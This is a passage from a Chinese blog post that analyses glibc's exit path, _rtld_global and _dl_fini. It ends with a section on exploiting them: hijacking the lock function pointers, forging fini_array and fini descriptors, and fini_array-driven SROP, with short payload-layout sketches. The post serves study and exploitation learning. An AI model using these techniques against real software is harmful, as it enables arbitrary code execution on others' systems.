*/</span></span><br><span class="line">  <span class="type">uintptr_t</span> pointer_chk_guard = _dl_setup_pointer_guard(_dl_random, stack_chk_guard);</span><br><span class="line"></span><br><span class="line">    ...;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 注册动态链接器(ld.so.2)的析构函数  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_likely(rtld_fini != <span class="literal">NULL</span>))</span><br><span class="line">    __cxa_atexit((<span class="type">void</span> (*)(<span class="type">void</span> *))rtld_fini, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 进行一些简单的libc初始化工作: 在libc中保存argc argv env三个参数 */</span></span><br><span class="line">  __libc_init_first(argc, argv, __environ);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 注册ELF的fini函数  */</span></span><br><span class="line">  <span class="keyword">if</span> (fini)</span><br><span class="line">    __cxa_atexit((<span class="type">void</span> (*)(<span class="type">void</span> *))fini, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 如果ELF有构造函数的话, 那么先调用init() */</span></span><br><span class="line">  <span class="keyword">if</span> (init)</span><br><span class="line">    (*init)(argc, argv, __environ MAIN_AUXVEC_PARAM);</span><br><span class="line"></span><br><span class="line">    ...;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 调用main()  */</span></span><br><span class="line">  result = main(argc, argv, __environ MAIN_AUXVEC_PARAM);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 如果main()返回后, __libc_start_main()回帮他调用exit()函数 */</span></span><br><span class="line">  <span class="built_in">exit</span>(result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至此我们知道libc_start_mian()会在exit_funcs中放入下面两个函数</p><p><strong>ELF的fini函数</strong>和<strong>ld的rtld_fini函数</strong></p><p>然后会调用一个构造函数:</p><p><strong>init()</strong></p><h3 id="ELF的fini"><a href="#ELF的fini" class="headerlink" title="ELF的fini()"></a>ELF的fini()</h3><p>被编译在elf的text段中, 由_start()传递地址给__libc_start_main()</p><p>发现其是一个空函数,因为其只有在静态编译下才会起作用,故而动态编译该函数为空</p><p>静态编译时:该函数会逐一取出fini_array数组中的函数指针执行，该函数指针数组位于bss段上</p><h3 id="ELF的init"><a href="#ELF的init" class="headerlink" title="ELF的init()"></a><strong>ELF的init()</strong></h3><p>让我们思考一个问题: 如果只有fini与init的话, ELF只能有一个构造/ 析构函数</p><p>当具有多个构造析构函数时改怎么办呢?</p><p>ELF的解决方法是, 把所有的构造函数的指针放在一个段: .init_array中, 所有的析构函数的指针放在一个段 .fini_array中</p><p><strong>init()就负责遍历.init_array, 并调用其中的构造函数, 从而完成多个构造函数的调用</strong></p><h3 id="ld的rtdl-fini"><a href="#ld的rtdl-fini" class="headerlink" title="ld的rtdl_fini()"></a>ld的rtdl_fini()</h3><p>我们说完了.init_array, 那么对于.fini_array呢?</p><p>很明显不是ELF的fini()负责 , 因为他就是一个空函数, 那么就只能<u>由rtdl_fini来负责</u></p><p><strong><em>rtdl_fini实际指向_dl_fini()函数</em></strong>, 源码在dl-fini.c文件中, 会被编译到ld.so.2中</p><p>我们把进程空间中的一个单独文件, 称之为模块</p><p>ld.so.2会通过dl_open()把所需文件到进程空间中, 他会把所有映射的文件都记录在结构体_rtld_global中</p><p>当一个进程终止, ld.so.2自然需要卸载所映射的模块, 这需要调用每一个非共享模块的fini_arrary段中的析构函数</p><p><strong>一言以蔽之: _dl_fini()的功能就是调用进程空间中所有模块的析构函数</strong></p><h3 id="rtld-global结构体"><a href="#rtld-global结构体" class="headerlink" title="rtld_global结构体"></a>rtld_global结构体</h3><p>接着来看_rtld_global结构体, 这个结构体很复杂, 我们只看与本文相关的</p><p>_rtld_global一般通过宏GL来引用, 这个结构体定义在ld.so.2的data段中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> GL(name) _rtld_global._##name</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> <span class="title">rtld_global</span> _<span class="title">rtld_global</span> __<span class="title">rtld_global_attribute__</span>;</span></span><br></pre></td></tr></table></figure><ul><li>再看其结构体struct rtld_global的定义<ul><li>一些缩写的含义:<ul><li>ns代表着NameSpace</li><li>nns代表着Num of NameSpace</li></ul></li><li>struct rtld_global先以命名空间为单位建立了一个数组 _dl_ns[DL_NNS]</li><li>在每个命名空间内部加载的模块以双向链表组织, 通过_ns_loaded索引</li><li>同时每个命名空间内部又有一个符号表_ns_unique_sym_table, 记录着所有模块导出的符号集合</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rtld_global</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> DL_NNS 16</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_namespaces</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="comment">//每个模块用_ns_loaded描述, 这个命名空间中所映射的模块组成一个双向链表, _ns_loaded就是这个链表的指针</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *_<span class="title">ns_loaded</span>;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* _ns_loaded中有多少模块 */</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> _ns_nloaded;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 映射模块的搜索表 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> *_<span class="title">ns_main_searchlist</span>;</span></span><br><span class="line">        <span class="comment">/* This is zero at program start to signal that the global scope map is</span></span><br><span class="line"><span class="comment">       allocated by rtld.  Later it keeps the size of the map.  It might be</span></span><br><span class="line"><span class="comment">       reset if in _dl_close if the last global object is removed.  */</span></span><br><span class="line">        <span class="type">size_t</span> _ns_global_scope_alloc;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 这个命名空间中的符号表, 单个命名空间中的符号不允许重复 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">unique_sym_table</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            __rtld_lock_define_recursive(, lock) <span class="class"><span class="keyword">struct</span> <span class="title">unique_sym</span></span></span><br><span class="line"><span class="class">            &#123;</span></span><br><span class="line">                <span class="type">uint32_t</span> hashval;           <span class="comment">//符号hash值</span></span><br><span class="line">                <span class="type">const</span> <span class="type">char</span> *name;           <span class="comment">//名称</span></span><br><span class="line">                <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> * sym;      <span class="comment">//符号</span></span><br><span class="line">                <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">map</span>;</span> <span class="comment">//所属模块</span></span><br><span class="line">            &#125; * entries;                   <span class="comment">//entries可以理解为struct unique_sym数组的指针, 通过entries[idx]就可找到第idx个符号</span></span><br><span class="line">            <span class="type">size_t</span> size;                   <span class="comment">//有多少个元素</span></span><br><span class="line">            <span class="type">size_t</span> n_elements;</span><br><span class="line">            <span class="type">void</span> (*<span class="built_in">free</span>)(<span class="type">void</span> *); <span class="comment">//析构函数</span></span><br><span class="line">        &#125; _ns_unique_sym_table;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 记录命名空间变化的, debug用 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">r_debug</span> _<span class="title">ns_debug</span>;</span></span><br><span class="line">    &#125; _dl_ns[DL_NNS]; <span class="comment">//一个命名空间一个link_namespace结构体</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* _dl_nns表示使用了多少个命名空间: Dynamic Link Num of NameSpace */</span></span><br><span class="line">    <span class="type">size_t</span> _dl_nns;</span><br><span class="line"></span><br><span class="line">    ...;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着我们分析下struct link_map, 来看看ld是怎么描述每一个模块的</p><ul><li>ELF文件都是通过节的组织的, ld自然也延续了这样的思路,</li><li>l_info中的指针都指向ELF中Dyn节中的描述符, Dyn中节描述符类型是ElfW(Dyn)</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">   ElfW(Addr) l_addr;                <span class="comment">/* 模块在内存中的的基地址 */</span></span><br><span class="line">   <span class="type">char</span> *l_name;                     <span class="comment">/* 模块的文件名  */</span></span><br><span class="line">   ElfW(Dyn) * l_ld;                 <span class="comment">/* 指向ELF中的Dynamic节 */</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>, *<span class="title">l_prev</span>;</span> <span class="comment">/* 双向链表指针 */</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_real</span>;</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">/* 这个模块所属NameSapce的idx  */</span></span><br><span class="line">   Lmid_t l_ns;</span><br><span class="line"></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">libname_list</span> *<span class="title">l_libname</span>;</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">/* </span></span><br><span class="line"><span class="comment">      l_info是ELF节描述符组成的的数组</span></span><br><span class="line"><span class="comment">      ELF中一个节, 使用一个ElfW(Dyn)描述</span></span><br><span class="line"><span class="comment">      各个类型的节在l_info中的下标固定, 因此可以通过下标来区分节的类型</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">   ElfW(Dyn) * l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];</span><br><span class="line"></span><br><span class="line">   <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Phdr)</span> * l_phdr; <span class="comment">/* ELF的头表  */</span></span><br><span class="line">   ElfW(Addr) l_entry;        <span class="comment">/* ELF入口点  */</span></span><br><span class="line">   ElfW(Half) l_phnum;        <span class="comment">/* 头表中有多少节  */</span></span><br><span class="line">   ElfW(Half) l_ldnum;        <span class="comment">/* dynamic节中有多少描述符  */</span></span><br><span class="line"></span><br><span class="line">    ...;        </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ElfW(Dyn)是一个节描述符类型(也就是一个宏), 宏展开结果为<strong>Elf64_Dyn</strong>, 这个类型被定义在elf.h文件中, 与ELF中的节描述对应</p><p>这个结构体在elf的学习中很重要</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">Elf64_Sxword    d_tag;            <span class="comment">/* 便签, 用于标注描述符类型,每一个描述符类型都对应一个类型 */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span>        </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Xword d_val;        <span class="comment">/* 内容可以是一个值 */</span></span><br><span class="line">  Elf64_Addr d_ptr;            <span class="comment">/* 也可以是一个指针 */</span></span><br><span class="line">&#125; d_un;</span><br><span class="line">&#125; Elf64_Dyn;</span><br></pre></td></tr></table></figure><p>至此rtld_global的结构就清楚了, 他自顶向下按照: <strong>命名空间-&gt;模块-&gt;节</strong> 的形式<u>描述所有的模块,</u> 通过_ns_unique_sym_table描述命名空间中所有的可见符号</p><h2 id="dl-fini-源码分析"><a href="#dl-fini-源码分析" class="headerlink" title="_dl_fini()源码分析"></a>_dl_fini()源码分析</h2><p>理解了模块是如何组织的之后, _dl_fini的任务就显而易见了:</p><ul><li>遍历rtld_global中所有的命名空间</li><li>遍历命名空间中所有的模块</li><li><strong>找到这个模块的fini_array段, 并调用其中的所有函数指针</strong></li><li><strong>找到这个模块的fini段, 调用fini()</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> internal_function _dl_fini(<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">    <span class="type">int</span> do_audit = <span class="number">0</span>;</span><br><span class="line">again:</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="keyword">for</span> (Lmid_t ns = GL(dl_nns) - <span class="number">1</span>; ns &gt;= <span class="number">0</span>; --ns) <span class="comment">//遍历_rtld_global中的所有非共享模块: _dl_ns[DL_NNS]</span></span><br><span class="line">    &#123;</span><br><span class="line">        __rtld_lock_lock_recursive(GL(dl_load_lock)); <span class="comment">//对rtld_global上锁</span></span><br><span class="line"></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> nloaded = GL(dl_ns)[ns]._ns_nloaded;</span><br><span class="line">        <span class="comment">/* 如果这个NameSapce没加载模块, 或者不需要释放, 就不需要做任何事, 就直接调用rtld中的函数指针释放锁 */</span></span><br><span class="line">        <span class="keyword">if</span> (nloaded == <span class="number">0</span> || GL(dl_ns)[ns]._ns_loaded-&gt;l_auditing != do_audit)</span><br><span class="line">            __rtld_lock_unlock_recursive(GL(dl_load_lock));</span><br><span class="line">        <span class="keyword">else</span> <span class="comment">//否则遍历模块</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* 把这个命名空间中的所有模块指针, 都复制到maps数组中  */</span></span><br><span class="line">            <span class="keyword">struct</span> link_map *maps[nloaded];</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span>;</span></span><br><span class="line">            assert(nloaded != <span class="number">0</span> || GL(dl_ns)[ns]._ns_loaded == <span class="literal">NULL</span>);</span><br><span class="line">            <span class="keyword">for</span> (l = GL(dl_ns)[ns]._ns_loaded, i = <span class="number">0</span>; l != <span class="literal">NULL</span>; l = l-&gt;l_next) <span class="comment">//遍历链表</span></span><br><span class="line">                <span class="keyword">if</span> (l == l-&gt;l_real)                                                <span class="comment">/* Do not handle ld.so in secondary namespaces.  */</span></span><br><span class="line">                &#123;</span><br><span class="line">                    assert(i &lt; nloaded);</span><br><span class="line"></span><br><span class="line">                    maps[i] = l;</span><br><span class="line">                    l-&gt;l_idx = i;</span><br><span class="line">                    ++i;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">/* Bump l_direct_opencount of all objects so that they are not dlclose()ed from underneath us.  */</span></span><br><span class="line">                    ++l-&gt;l_direct_opencount;</span><br><span class="line">                &#125;</span><br><span class="line">            ...;</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> nmaps = i;    <span class="comment">//多少个模块</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">/* 对maps进行排序, 确定析构顺序 */</span></span><br><span class="line">            _dl_sort_fini(maps, nmaps, <span class="literal">NULL</span>, ns);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//释放锁</span></span><br><span class="line">            __rtld_lock_unlock_recursive(GL(dl_load_lock));    </span><br><span class="line"></span><br><span class="line">            <span class="comment">/* 从前往后, 析构maps中的每一个模块 */</span></span><br><span class="line">            <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nmaps; ++i)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span> =</span> maps[i];</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (l-&gt;l_init_called)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">/* Make sure nothing happens if we are called twice.  */</span></span><br><span class="line">                    l-&gt;l_init_called = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">/* 是否包含fini_array节, 或者fini节 */</span></span><br><span class="line">                    <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span> || l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="comment">/* debug时打印下相关信息 */</span></span><br><span class="line">                        <span class="keyword">if</span> (__builtin_expect(GLRO(dl_debug_mask) &amp; DL_DEBUG_IMPCALLS, <span class="number">0</span>))</span><br><span class="line">                            _dl_debug_printf(<span class="string">&quot;\ncalling fini: %s [%lu]\n\n&quot;</span>,DSO_FILENAME(l-&gt;l_name),ns);</span><br><span class="line"></span><br><span class="line">                        <span class="comment">/* 如果有fini_array节的话 */</span></span><br><span class="line">                        <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span>)</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="comment">/*</span></span><br><span class="line"><span class="comment">                                l-&gt;l_addr: 模块l的加载基地址</span></span><br><span class="line"><span class="comment">                                l-&gt;l_info[DT_FINI_ARRAY]: 模块l中fini_array节的描述符</span></span><br><span class="line"><span class="comment">                                l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr: 模块l中fini_arrary节的偏移</span></span><br><span class="line"><span class="comment">                                array: 为模块l的fini_array节的内存地址</span></span><br><span class="line"><span class="comment">                            */</span></span><br><span class="line">                            ElfW(Addr) *<span class="built_in">array</span> = (ElfW(Addr) *)(l-&gt;l_addr + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line"></span><br><span class="line">                            <span class="comment">/* </span></span><br><span class="line"><span class="comment">                                ELF中 fini_arraysz节用来记录fini_array节的大小</span></span><br><span class="line"><span class="comment">                                l-&gt;l_info[DT_FINI_ARRAYSZ]: 模块l中fini_arraysz节描述符</span></span><br><span class="line"><span class="comment">                                l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val: 就是fini_array节的大小, 以B为单位</span></span><br><span class="line"><span class="comment">                                i: fini_array节的大小/一个指针大小, 即fini_array中有多少个析构函数</span></span><br><span class="line"><span class="comment">                            */</span></span><br><span class="line">                            <span class="type">unsigned</span> <span class="type">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val / <span class="keyword">sizeof</span>(ElfW(Addr)));</span><br><span class="line">                            <span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)    <span class="comment">//从后往前, 调用fini_array中的每一个析构函数</span></span><br><span class="line">                                ((<span class="type">fini_t</span>)<span class="built_in">array</span>[i])();</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="comment">/* 调用fini段中的函数 */</span></span><br><span class="line">                        <span class="keyword">if</span> (l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>)</span><br><span class="line">                            DL_CALL_DT_FINI(l, l-&gt;l_addr + l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    ...;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">/* Correct the previous increment.  */</span></span><br><span class="line">                --l-&gt;l_direct_opencount;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="思考2-rtdl-fini-带来的可利用点"><a href="#思考2-rtdl-fini-带来的可利用点" class="headerlink" title="思考2:rtdl_fini()带来的可利用点"></a>思考2:rtdl_fini()带来的可利用点</h2><p><strong>rtdl_fini()十分依赖与rtld_global这一数据结构, 并且rtld_global中的数据并没有被加密</strong>, 这就带来了两个攻击面</p><ul><li><strong>劫持rtld_global中的锁相关函数指针</strong></li><li><strong>修改rtld_global中的l_info, 伪造fini_array/ fini的节描述符, 从而劫持fini_array/ fini到任意位置, 执行任意函数</strong></li></ul><h3 id="0x1劫持rtld-global中的函数指针"><a href="#0x1劫持rtld-global中的函数指针" class="headerlink" title="0x1劫持rtld_global中的函数指针"></a>0x1劫持rtld_global中的函数指针</h3><p>ld相关函数在使用rtld_global时都需要先上锁, 以避免多进程下的条件竞争问题</p><p>相关函数包括但不限于:</p><ul><li>_dl_open()</li><li>_dl_fini()</li><li>….</li></ul><p>上锁操作是通过宏进行的, 宏定义:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> __rtld_lock_lock_recursive(NAME) GL(dl_rtld_lock_recursive) (&amp;(NAME).mutex)</span></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> GL(name) _rtld_global._##name</span></span><br></pre></td></tr></table></figure><p>查看宏<code>GL</code>的定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">if</span> IS_IN (rtld)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> GL(name) _rtld_local._##name</span></span><br><span class="line"><span class="meta"># <span class="keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> GL(name) _rtld_global._##name</span></span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>宏展开:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">    __rtld_lock_lock_recursive(GL(dl_load_lock)); <span class="comment">//对rtld_global上锁</span></span><br><span class="line">=&gt;    GL(dl_rtld_lock_recursive) (&amp; GL(dl_load_lock).mutex)</span><br><span class="line">=&gt;    _rtld_global.dl_rtld_lock_recursive(&amp;_rtld_global.dl_load_lock.mutex)</span><br></pre></td></tr></table></figure><p>可以看到实际调用的是dl_rtld_lock_recursive函数指针</p><p>释放锁的操作也是类似的, 调用的是_dl_rtld_unlock_recursive函数指针, 这两个函数指针再rtld_global中定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rtld_global</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ...;</span><br><span class="line">    <span class="type">void</span> (*_dl_rtld_lock_recursive)(<span class="type">void</span> *);</span><br><span class="line">    <span class="type">void</span> (*_dl_rtld_unlock_recursive)(<span class="type">void</span> *);</span><br><span class="line">    ...;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ld作为mmap的文件, 与libc地址固定</strong></p><p><strong>也就是说, 当有了任意写+libc地址后, 我们可以通过覆盖_rtld_global中的lock/ unlock函数指针来getshell</strong></p><h3 id="0x2劫持l-info伪造fini-array节"><a href="#0x2劫持l-info伪造fini-array节" class="headerlink" title="0x2劫持l_info伪造fini_array节"></a>0x2劫持l_info伪造fini_array节</h3><p>我们的目标是伪造rtld_global中关于fini_array节与fini_arraysize节的描述</p><p>将fini_array节迁移到一个可控位置, 比如堆区, 然后在这个可控位置中写入函数指针, 那么在exit()时就会依次调用其中的函数指针</p><p><strong>l_info中关于fini_array节的描述符下标为26, 关于fini_arraysz节的下标是28,l_info中的指针正好指向的就是Dynamic段中相关段描述符</strong></p><p>此时我们就可以回答ELF中fini_array中的析构函数是怎么被调用的这个问题了:</p><p><strong>exit()调用__exit_funcs链表中的_rtdl_fini()函数, 由_rtdl_fini()函数寻找到ELF的fini_array节并调用</strong></p><p>假设我们修改rtld_global中的l_info[0x1a]为addrA, 修改l_info[0x1c]为addrB</p><p>那么首先在addrA addrB中伪造好描述符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">addrA: flat(0x1a, addrC)</span><br><span class="line">addrB: flat(0x1b, N)</span><br></pre></td></tr></table></figure><p><strong>然后在addrC中写入函数指针就可以在exit时执行了</strong></p><h3 id="0x3fini-array与ROP-SROP"><a href="#0x3fini-array与ROP-SROP" class="headerlink" title="0x3fini_array与ROP(SROP)"></a>0x3fini_array与ROP(SROP)</h3><p>当我们可以劫持fini_array之后, 我们就具备了连续调用多个函数的能力, 那么有无可能像ROP一样, 让多个函数进行组合, 完成复杂的工作?</p><p>多个fini_array函数调用之间, 寄存器环境十分稳定, 只有: rdx r13会被破坏, 这是一个好消息</p><p>考察执行call时的栈环境, 我们发现rdi总是指向一个可读可写区域, 可以当做我们函数的缓冲区</p><p>那么就已经有了大致的利用思路,</p><ol><li>让fini_array先调用gets()函数, 在rdi中读入SigreturnFrame</li><li>然后再调用setcontext+53, 即可进行SROP, 劫持所有寄存器</li><li>如果高版本libc, setcontext使用rdx作为参数, 那么在gets(rdi)后还需要一个gadget, 能通过rdi设置rdx,<br>再执行setcontext</li></ol><h3 id="0x4劫持fini"><a href="#0x4劫持fini" class="headerlink" title="0x4劫持fini"></a>0x4劫持fini</h3><p>fini段在l_info中下标为13,这个描述符中直接放的就是fini函数指针(前面有提到动态链接下这是个空函数，由_dl_fini调用), 利用手法较为简单, 但是只能执行一个函数, 通常设置为onegadget</p><p>例如我们可以<strong>修改rtld_global中l_info[0xd]为addrA, 然后再addrA中写入</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addrA: flat(0xd, 